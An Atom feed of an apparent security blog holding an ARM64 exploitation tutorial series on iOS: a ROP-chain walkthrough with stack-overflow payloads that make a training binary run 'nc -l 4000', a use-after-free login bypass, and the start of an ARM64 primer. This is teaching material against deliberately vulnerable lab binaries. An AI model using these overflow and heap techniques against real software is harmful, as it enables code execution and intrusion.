<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-08-23T01:21:17+00:00</updated><id>/feed.xml</id><title type="html">Prateekg147</title><subtitle>I am Prateek Gianchandani. Currently i am working as a Security Researcher in UAE.  I have interests in Exploit Development, Mobile and Browser Security....&lt;a href=&quot;/about&quot;&gt; Continue&lt;/a&gt;
</subtitle><author><name>Prateek Gianchandani</name></author><entry><title type="html">ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain</title><link href="/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html" rel="alternate" type="text/html" title="ARM64 Reversing and Exploitation Part 3 - A Simple ROP Chain" /><published>2020-09-06T09:31:00+00:00</published><updated>2020-09-06T09:31:00+00:00</updated><id>/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain</id><content type="html" xml:base="/2020/09/06/arm64-reversing-and-exploitation-part-3-a-simple-rop-chain.html"><![CDATA[<p>Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets.
More details about ROP can be found <a href="https://en.wikipedia.org/wiki/Return-oriented_programming#:~:text=Return%2Doriented%20programming%20(ROP),space%20protection%20and%20code%20signing. ">here</a>. In this blog post, we will be writing a ROP Chain for the <em>rop</em> binary. The binaries for this article can be found <a href="https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing">here</a>.</p>

<p>Your task here is to call the function <em>chain1</em> followed by <em>chain2</em></p>

<p>SSH to your Corellium or iOS device and run the rop binary</p>

<p><strong>$ rop</strong></p>

<p>Run the rop command</p>

<p><strong>./rop</strong></p>

<p><img src="/images/posts/arm/12.png" alt="1" /></p>

<!--more-->

<p>Nothing much happnes, however on reversing the main function, we find that it also accepts an extra argument and tries to open a file with the name <strong>hax.bin</strong> if it gets that argument (argument could be anything). <strong>arg0 = argc</strong> here which is 2 if one argument is passed.</p>

<p><img src="/images/posts/arm/13.png" alt="1" /></p>

<p>Sure enough, that’s what is happening if we look at the code.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Address of main function is %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">main</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"ROP chain challenge, call the function chain1 followed by chain2</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
    <span class="n">gets</span><span class="p">(</span><span class="n">name</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span><span class="p">){</span>
        <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="o">=</span><span class="n">fopen</span><span class="p">(</span><span class="s">"hax.bin"</span><span class="p">,</span><span class="s">"rb"</span><span class="p">);</span>
        <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_END</span><span class="p">);</span>
        <span class="kt">size_t</span> <span class="n">fs</span> <span class="o">=</span> <span class="n">ftell</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
        <span class="n">fseek</span><span class="p">(</span><span class="n">f</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">SEEK_SET</span><span class="p">);</span>
        <span class="n">fread</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fs</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Hello %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">name</span><span class="p">);</span>  
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>As mentioned in the challenge, our task is to call the function <strong>chain1</strong> followed by <strong>chain2</strong>. Calling these functions in a chain will open a netcat listener on the device on port 4000.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">my_strcpy</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">dst</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">){</span>
    <span class="k">while</span> <span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">dst</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">src</span><span class="o">++</span><span class="p">)));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">chain1</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Executing first chain.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">my_strcpy</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="s">"nc -l 4000"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">chain2</span><span class="p">(){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Executing second chain.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure>

<p>Anothing thing we must be aware of is the slide. The slide is essentially a random value added to the start address of the binary to make sure all the addresses are slid. This program has a deliberate information leak where it dumps out the address of the main function. We can find the slide by subtracting this address of the main function in the running binary and the address of the main function in Hopper.</p>

<p>let’s run the binary again with a random argument.</p>

<p><img src="/images/posts/arm/14.png" alt="1" /></p>

<p>The address of the main function is 0x102693d50</p>

<p>and the address in the binary is 0x100007d50</p>

<p><img src="/images/posts/arm/27.png" alt="1" /></p>

<p>We can find the slide by subtracting the addresses. You can use python or any hex calculator (for e.g https://www.calculator.net/hex-calculator.html) to subtract these addresses</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x102693d50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span>
<span class="err">'</span><span class="mh">0x268c000</span><span class="err">'</span></code></pre></figure>

<p>So the slide in this case is 0x268c000. Using this, we can find the actual address of the <strong>chain1</strong> and the <strong>chain2</strong> function. We just need to add the slide to their addresses.</p>

<p><strong>It is important to note that the slide on each run will be different.</strong></p>

<p>The idea here is to keep entering input that would overwrite the lr (link register). After some attempts, we find that the following input overwrites the lr (link register) by CCCCCCCC which is \x43\x43\x43\x43\x43\x43\x43\x43.</p>

<p>Create a <strong>hax.bin</strong> file in the same folder using the below command.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x43\x43\x43\x43\x43\x43\x43\x43</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p><img src="/images/posts/arm/15.png" alt="1" /></p>

<p>Run the rop binary again and press enter after entering any input. It will read the input from the hax.bin file we just created and crash.</p>

<p>Now we need to look at the crash logs. There are a couple of ways to look at them.</p>

<p>a) On your device , go to <strong>Settings -&gt; Privacy -&gt; Analytics and Improvements -&gt; Analytics data</strong> and look at the latest crash log for the rop binary (the crash log with the highest number is the latest one)</p>

<p>We can see that the lr register is overwritten by 4343434343434343 which is all C</p>

<p><img src="/images/posts/arm/16.png" alt="1" /></p>

<p>c) Another way is to look via Xcode if your device is connected to your laptop by going to <strong>Window -&gt; Devices and Simulators -&gt; Select your device on the left and click on Logs</strong>
<img src="/images/posts/arm/17.png" alt="1" /></p>

<p>c) Another way is to use the command line utility <strong>idevicecrashreport</strong>. Make sure you have the package libimobiledevice installed on your laptop.</p>

<p>Run the command <strong>idevicecrashreport .</strong> to move the crash logs to your computer and analyze them.</p>

<p>Anyways, so it’s pretty clear what we need to do. We need to overwrite the final part of the payload which is \x43\x43\x43\x43\x43\x43\x43\x43 with the address of the chain1 function. However, there is a tricky part here. On ARM64, the value of lr (x30) register is first stored on the stack and then taken off the stack. See image below.</p>

<p><img src="/images/posts/arm/18.png" alt="1" /></p>

<p>We need to be able to control the x30 register (which is link register) once the function chain1 finishes execution. There seems to be no way to do that right now.</p>

<p>However, if we jump to the second instruction of chain1 function , we can trick the function into loading another value from the stack which might be controllable by us. Ofcourse, this is going to misalign the stack but we purposely want to misalign the stack in order to be able to pop next return address (x30) from the stack, which we can control, since we can smash the stack upwards as much as we want.</p>

<p><img src="/images/posts/arm/19.png" alt="1" /></p>

<p>So to jump to the second instruction , whose address is 0x100007cdc in the binary, we need to first find the slid address in the binary by adding the slide.</p>

<p>Let’s run the binary again, this time the address of main function is 0x10023bd50 , which means the slide is calculated below</p>

<p><img src="/images/posts/arm/21.png" alt="1" /></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&gt;&gt;&gt;</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x10023bd50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span>
<span class="mh">0x234000</span></code></pre></figure>

<p>Slid address of the second instruction of chain1 =</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">hex</span><span class="p">(</span><span class="mh">0x100007cdc</span> <span class="o">+</span> <span class="mh">0x234000</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x10023bcdc</span> <span class="n">or</span> <span class="mh">0x000000010023bcdc</span></code></pre></figure>

<p>Let’s put this in our payload</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\xbc\x23\x00\x01\x00\x00\x00</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p>Remove any previous hax.bin file also if any and create a new one as shown below.</p>

<p><img src="/images/posts/arm/20.png" alt="1" /></p>

<p>Press enter on the running rop binary and you will see that the first chain gets executed. Nice, we are halfway there. Now we need to find a way to execute chain2 function.</p>

<p><img src="/images/posts/arm/22.png" alt="1" /></p>

<p>Now we need to keep entering our payloads until we overwrite the lr again. We can then change the lr again to point to chain2 function.</p>

<p>After testing several times we come up with the following payload using which we are able to overwrite lr register again.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x42\x42\x42\x42\x42\x42\x42\x42\x46\x46\x46\x46\x46\x46\x46\x46\x48\x48\x48\x48\x48\x48\x48\x48</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<ul>
  <li>/x41 is the initial junk</li>
  <li>/x42 should point to the initial lr register which we should set to the second instruction of the chain1 function</li>
  <li>/x46 is junk as well</li>
  <li>/x48 should point to the chain2 function</li>
</ul>

<p>Ok, will all this information in place, we are now able to write our rop chain again.</p>

<p>Let’s run the program again. Address of main function is 0x1008b3d50 this time.</p>

<p><img src="/images/posts/arm/23.png" alt="1" /></p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">slide</span> <span class="o">=</span> <span class="n">hex</span><span class="p">(</span><span class="mh">0x1008b3d50</span> <span class="o">-</span> <span class="mh">0x100007d50</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x8ac000</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">slid</span> <span class="n">address</span> <span class="k">for</span> <span class="n">second</span> <span class="n">instruction</span> <span class="n">of</span> <span class="n">chain</span> <span class="mi">1</span> <span class="o">=</span> 
<span class="n">hex</span><span class="p">(</span><span class="mh">0x8ac000</span> <span class="o">+</span> <span class="mh">0x100007cdc</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1008b3cdc</span> <span class="n">or</span> <span class="mh">0x00000001008b3cdc</span>

<span class="n">slid</span> <span class="n">address</span> <span class="k">for</span> <span class="n">chain2</span> <span class="n">function</span> <span class="o">=</span> 
<span class="n">hex</span><span class="p">(</span><span class="mh">0x8ac000</span> <span class="o">+</span> <span class="mh">0x100007d2c</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x1008b3d2c</span> <span class="n">or</span> <span class="mh">0x00000001008b3d2c</span></code></pre></figure>

<p>Using this info, we can now create our Rop chain</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">echo</span> <span class="o">-</span><span class="n">ne</span> <span class="s">"</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xdc\x3c\x8b\x00\x01\x00\x00\x00\x46\x46\x46\x46\x46\x46\x46\x46\x2c\x3d\x8b\x00\x01\x00\x00\x00</span><span class="s">"</span> <span class="o">&gt;</span> <span class="n">hax</span><span class="p">.</span><span class="n">bin</span></code></pre></figure>

<p><img src="/images/posts/arm/26.png" alt="1" /></p>

<p>Press enter where the rop binary is running and Success, we can see that the second chain was executed and the application is still running, which means it opened a listening port on netcat.</p>

<p><img src="/images/posts/arm/24.png" alt="1" /></p>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><category term="ios" /><summary type="html"><![CDATA[Return-oriented programming (ROP) allows an attacker to execute code in the presence of security defenses such as executable space protection and code signing using ROP Gadgets. More details about ROP can be found here. In this blog post, we will be writing a ROP Chain for the rop binary. The binaries for this article can be found here.]]></summary></entry><entry><title type="html">ARM64 Reversing and Exploitation Part 2 - Use After Free</title><link href="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html" rel="alternate" type="text/html" title="ARM64 Reversing and Exploitation Part 2 - Use After Free" /><published>2020-09-06T09:30:00+00:00</published><updated>2020-09-06T09:30:00+00:00</updated><id>/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free</id><content type="html" xml:base="/2020/09/06/arm64-reversing-and-exploitation-part-2-use-after-free.html"><![CDATA[<p>In this blog post, we will be exploiting a Use-after-free vulnerability in the <em>vuln</em> binary. The binaries for this and the next article can be found <a href="https://drive.google.com/file/d/1f3PDEz-Fh9I3rSDhpMGW5ZrCU9g0BjKL/view?usp=sharing">here</a>. This UaF challenge is based on the one used by <a href="https://exploit.education/protostar/heap-two/">Protostar</a></p>

<p><a href="https://owasp.org/www-community/vulnerabilities/Using_freed_memory">Use-after-free</a> vulnerabilities occurs on the use of heap allocated memory after it has been freed. This can lead to several unexpected behaviours, from a crash to code execution.</p>

<p>Anyways, let’s get started. Copy the vuln binary to your iOS or Corellium device.</p>

<p>Run the binary <strong>vuln</strong>. You get a message that says “Better luck next time”</p>

<p><img src="/images/posts/arm/1.png" alt="1" /></p>

<p>Let’s open the binary in Hopper to see what’s going on. Let’s have a look at the main function.</p>

<p>Just like the previous example on Heap Overflow, our objective here is to jump the <strong>useafterfree</strong> function. For that, we need to pass in the argument <strong>uaf</strong></p>

<!--more-->

<p><img src="/images/posts/arm/6.png" alt="1" /></p>

<p>The function then jumps execution to the function <strong>useafterfree</strong></p>

<p><strong>./vuln uaf</strong></p>

<p><img src="/images/posts/arm/7.png" alt="1" /></p>

<p>The output shows the address of the <strong>user</strong> and the <strong>customerChat</strong> object. We see several commands here, however on reversing the function, we find there is another hidden command <strong>reset</strong> that basically frees the <strong>user</strong> object.</p>

<p><img src="/images/posts/arm/8.png" alt="1" />
<img src="/images/posts/arm/8a.png" alt="1" /></p>

<p>This can be confirmed by looking at the code itself</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">useafterfree</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Use after free challenge. Try to log in without entering the password. Available commands are:</span><span class="se">\n</span><span class="s">a) username XYZ</span><span class="se">\n</span><span class="s">b) login</span><span class="se">\n</span><span class="s">c) customerChat XYZ.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mh">0x400</span><span class="p">];</span>
    <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"{user = %p, customerChat = %p }</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">customerChat</span><span class="p">);</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">),</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"username "</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">user</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">currentUser</span><span class="p">));</span>
            <span class="n">memset</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">currentUser</span><span class="p">));</span>
            <span class="k">if</span><span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x100</span><span class="p">)</span> <span class="p">{</span>
            	<span class="n">printf</span><span class="p">(</span><span class="s">"Setting username</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">strcpy</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">,</span> <span class="n">line</span> <span class="o">+</span> <span class="mi">9</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"reset"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        	<span class="n">printf</span><span class="p">(</span><span class="s">"Freeing user object</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">free</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"customerChat "</span><span class="p">,</span> <span class="mi">13</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">customerChat</span> <span class="o">=</span> <span class="n">strdup</span><span class="p">(</span><span class="n">line</span> <span class="o">+</span> <span class="mi">12</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"currentUser"</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Current user is %s"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">username</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"login"</span><span class="p">,</span> <span class="mi">5</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span> <span class="s">"BBB"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"You have successfully logged in with password %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"Please enter your password</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"current password is %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>We see that the user struct object has an attribute <strong>password</strong> . This is being checked later on. If the password has three B’s, the user gets logged in.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">,</span> <span class="s">"BBB"</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">printf</span><span class="p">(</span><span class="s">"You have successfully logged in with password %s!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">user</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">);</span>
            <span class="p">}</span> </code></pre></figure>

<p>This is an example of a <strong>UaF</strong> since the user object can be freed by using the <strong>reset</strong> command and then calling <strong>if(user-&gt;password)</strong> will basically trigger the UaF.</p>

<p>We can also calculate the size of the user object. The user object is a object of struct <strong>currentUser</strong> as can be seen in the following line</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">user</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">currentUser</span><span class="p">));</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="n">currentUser</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
<span class="p">};</span></code></pre></figure>

<p>The size of the user object is 256 + 4 = 260 bytes.</p>

<p>If we can free the user object using <strong>reset</strong> and then overwrite it with the value <strong>BBBB</strong> such that we are able to overwrite the <strong>password</strong> property, we might be able to execute a <strong>Use-after-free</strong> condition and successfully log in.</p>

<p>Since our objective is to login, so let’s try that by first entering the username command,</p>

<p>$<strong>username admin</strong></p>

<p>$<strong>login</strong></p>

<p><img src="/images/posts/arm/9.png" alt="1" /></p>

<p>Now let’s enter the <strong>reset</strong> command, this will free the buffer. Now let’s enter the <strong>customerChat</strong> command followed by the chat and send 260 B’s (so the size of cutomerChat object is the same as than of user object), we keep entering the size of the chat around the same size of the user so that it can take over the memory address of the freed user object.</p>

<p><img src="/images/posts/arm/10.png" alt="1" /></p>

<p>After some tries, we see that the customerChat address is overlapping the user address, in this case we were able to overwrite the <strong>password</strong> property of the freed user object with all B’s. And hence entering the <strong>login</strong> command again gives us a success.</p>

<p>Command in order</p>

<ol>
  <li>username admin</li>
  <li>login</li>
  <li>reset</li>
  <li>customerChat BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB</li>
  <li>login</li>
</ol>]]></content><author><name>Prateek Gianchandani</name></author><category term="security" /><category term="ios" /><summary type="html"><![CDATA[In this blog post, we will be exploiting a Use-after-free vulnerability in the vuln binary. The binaries for this and the next article can be found here. This UaF challenge is based on the one used by Protostar]]></summary></entry><entry><title type="html">ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow</title><link href="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html" rel="alternate" type="text/html" title="ARM64 Reversing and Exploitation Part 1 - ARM Instruction Set + Simple Heap Overflow" /><published>2020-09-05T14:07:00+00:00</published><updated>2020-09-05T14:07:00+00:00</updated><id>/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow</id><content type="html" xml:base="/2020/09/05/arm64-reversing-and-exploitation-part-1-arm-instruction-set-heap-overflow.html"><![CDATA[<p>Hi Everyone ! In this blog series, we will be understanding the ARM instruction set and using that to reverse ARM Binaries followed by writing exploits for them. So let’s start with the basics of ARM64.</p>

<h2 id="arm64-intro">ARM64 Intro</h2>

<p>ARM64 is a family of RISC (reduced instruction set computer) architecture. The distinguishing factor of a RISC architecture is the use of a small, highly-optimized set of instructions, rather than the more specialized set often found in other types of architecture (for e.g CISC). ARM64 follows the Load/Store approach, in which both operands and destination must be in registers. The load–store architecture is an instruction set architecture that divides instructions into two category: memory access (load and store between memory and registers), and ALU operations (which only occur between registers). This differs from a register–memory architecture (for example, a CISC instruction set architecture such as x86) in which one of the operands for the ADD operation may be in memory, while the other is in a register. Using ARM architecture is ideal for mobile devices, since the RISC architecture requires few transistors, and hence leads to less power consumption and heating of the device, thereby leading to a better battery life which is essential for mobile devices.</p>

<p>Both the current iOS and Android phones use ARM processors, and the newer ones use ARM64 in specific. Reversing ARM64 assembly code is therefore vital to understanding the internal workings of a binary or any binary/app. It is impossible to cover the whole ARM64 instruction set in this blog series and hence we will be focusing on the most useful instructions and the most commonly used registers. It is also important to note that ARM64 is also referred as ARMv8 (8.1, 8.3 etc) while ARM32 is ARMv7(s).</p>

<!--more-->

